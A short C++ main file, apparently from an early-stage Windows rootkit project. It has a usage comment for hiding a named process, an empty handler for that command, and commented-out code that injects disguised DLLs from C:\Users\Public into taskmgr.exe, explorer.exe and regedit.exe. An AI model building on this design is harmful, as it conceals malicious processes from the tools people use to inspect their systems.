#include <iostream>
#include <Windows.h>
#include <vector>
#include <AccCtrl.h>
#include <Aclapi.h> 
#include <string>
#include <unordered_map>
#include "IPCObjects.h"
#include "multiDLLInjector.h"

using namespace std;

int main(int argc, char* argv[]){        
    unordered_map<string, vector<string>> injectionMap;
    vector<string> agentDescriptor;

    Serialitzator serialitzator("ipcObject");

    vector<string> stringsToSerialize = { "Hola", "Mundo", "C++", "asdsad"};
    serialitzator.serializeVectorString(stringsToSerialize,"serialized");

    vector<string> deserializedStrings = serialitzator.deserializeStringVector("serialized");

    getchar();

    // - rootkit.exe process hide processname.exe
    if (argc == 4 && strcmp(argv[1], "process") == 0 && strcmp(argv[2], "hide") == 0) {
		char* processName = argv[3];

	}
    

    // Inject DLL's into processes
    //injectionMap["taskmgr.exe"] = { "C:\\Users\\Public\\mscde.dll","C:\\Users\\Public\\msc23.dll"};
    //injectionMap["explorer.exe"] = { "C:\\Users\\Public\\mscde.dll" };
   // injectionMap["regedit.exe"] = { "C:\\Users\\Public\\mscde.dll" };

    //injectDlls(injectionMap);
}


